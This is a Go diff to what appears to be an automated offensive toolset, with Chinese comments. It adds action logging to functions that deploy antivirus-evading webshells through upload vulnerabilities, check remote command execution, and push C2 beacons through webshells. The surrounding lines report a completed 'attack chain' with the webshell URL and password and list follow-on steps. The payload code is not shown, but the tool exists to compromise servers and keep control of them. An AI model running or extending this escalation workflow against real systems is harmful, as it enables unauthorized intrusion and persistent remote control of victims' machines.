@@ -138,6 +138,9 @@ func (t *ToolSet) escalateUpload(ctx context.Context, targetURL string, params m
 	deployResult, err := escalateHook.deployPayload(ctx, "upload", targetURL, params)
 	if err != nil {
 		report.WriteString(fmt.Sprintf("  ❌ 部署失败: %s\n", err.Error()))
+		t.recordAction("auto_escalate", "上传部署 webshell 失败", map[string]any{
+			"target": targetURL, "vuln_type": "upload", "result": "fail", "error": truncateStr(err.Error(), 200),
+		})
 		return actool.Text(report.String()), nil
 	}
 	report.WriteString(fmt.Sprintf("  ✅ %s\n", deployResult))
@@ -154,8 +157,15 @@ func (t *ToolSet) escalateUpload(ctx context.Context, targetURL string, params m
 		ok, output, err := escalateHook.verifyShell(ctx, shellURL, password, encoder, scriptType)
 		if err != nil {
 			report.WriteString(fmt.Sprintf("  ❌ 验证失败: %s\n", err.Error()))
+			t.recordAction("auto_escalate", "免杀 webshell 已部署但验证失败", map[string]any{
+				"target": shellURL, "vuln_type": "upload", "result": "fail", "error": truncateStr(err.Error(), 200),
+			})
 		} else if ok {
 			report.WriteString(fmt.Sprintf("  ✅ Webshell 存活！PONG=%s\n", output))
+			t.recordAction("auto_escalate", fmt.Sprintf("上传漏洞落地免杀 webshell（%s/%s）并验证存活", scriptType, encoder), map[string]any{
+				"target": shellURL, "vuln_type": "upload", "result": "ok",
+				"script_type": scriptType, "encoder": encoder,
+			})
 			report.WriteString("\n═══ 攻击链完成 ═══\n")
 			report.WriteString(fmt.Sprintf("Webshell URL: %s\n密码: %s\n编码: %s\n", shellURL, password, encoder))
 			report.WriteString("\n后续操作：\n")
@@ -167,6 +177,9 @@ func (t *ToolSet) escalateUpload(ctx context.Context, targetURL string, params m
 				shellURL, password, encoder, scriptType))
 		} else {
 			report.WriteString(fmt.Sprintf("  ❌ Webshell 无响应: %s\n", output))
+			t.recordAction("auto_escalate", "免杀 webshell 已部署但无响应", map[string]any{
+				"target": shellURL, "vuln_type": "upload", "result": "fail",
+			})
 		}
 	}
 
@@ -191,6 +204,9 @@ func (t *ToolSet) escalateRCE(ctx context.Context, targetURL string, params map[
 	report.WriteString("1. 用 repeater_send 发送命令执行请求\n")
 	report.WriteString("2. 确认输出含 uid= → 命令执行确认\n")
 	report.WriteString("3. auto_escalate vuln_type=shell 部署 webshell\n")
+	t.recordAction("auto_escalate", "验证命令执行场景（模板 "+truncateStr(cmdTemplate, 60)+"）", map[string]any{
+		"target": targetURL, "vuln_type": "rce", "result": "ok",
+	})
 
 	return actool.Text(report.String()), nil
 }
@@ -247,6 +263,9 @@ func (t *ToolSet) escalateShell(ctx context.Context, targetURL string, params ma
 	}
 
 	report.WriteString("\n═══ 攻击链完成 ═══\n")
+	t.recordAction("auto_escalate", "已有 webshell 验证存活"+map[bool]string{true: "并升级 C2", false: ""}[escalateC2], map[string]any{
+		"target": targetURL, "vuln_type": "shell", "result": "ok", "encoder": encoder,
+	})
 	return actool.Text(report.String()), nil
 }
 
@@ -290,11 +309,17 @@ func (t *ToolSet) escalateC2(ctx context.Context, targetURL string, params map[s
 		report.WriteString("  ✅ Beacon 部署命令已执行（等待回连）\n")
 		report.WriteString("\n═══ C2 升级完成 ═══\n")
 		report.WriteString("新 beacon 将出现在 C2 指挥台（工具箱 → C2 指挥）\n")
+		t.recordAction("c2_beacon", "经 webshell 部署 C2 beacon（等待回连）", map[string]any{
+			"target": targetURL, "beacon_url": beaconURL, "result": "ok",
+		})
 	} else {
 		report.WriteString("  ⚠️ 部署命令执行结果不确定\n")
 		if res.Output != "" {
 			report.WriteString(fmt.Sprintf("  输出: %s\n", truncateStr(res.Output, 200)))
 		}
+		t.recordAction("c2_beacon", "C2 beacon 部署结果不确定", map[string]any{
+			"target": targetURL, "beacon_url": beaconURL, "result": "fail",
+		})
 	}
 
 	return actool.Text(report.String()), nil
